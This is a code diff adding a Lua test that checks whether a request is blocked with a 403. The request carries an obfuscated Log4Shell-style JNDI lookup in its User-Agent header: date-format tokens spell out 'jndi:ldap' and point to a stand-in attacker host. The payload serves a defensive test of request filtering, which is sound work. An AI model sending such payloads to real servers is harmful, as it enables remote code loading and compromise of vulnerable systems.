@@ -126,6 +126,16 @@ for _, strategy in helpers.all_strategies() do
         assert.response(r).has.status(403)
       end)
 
+      it("Checks for date format trickery", function()
+        local r = client:get("/request", {
+          headers = {
+            host = "test1.dev",
+            ['User-agent'] = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}"
+          }
+        })
+        assert.response(r).has.status(403)
+      end)
+
   end)
 
 
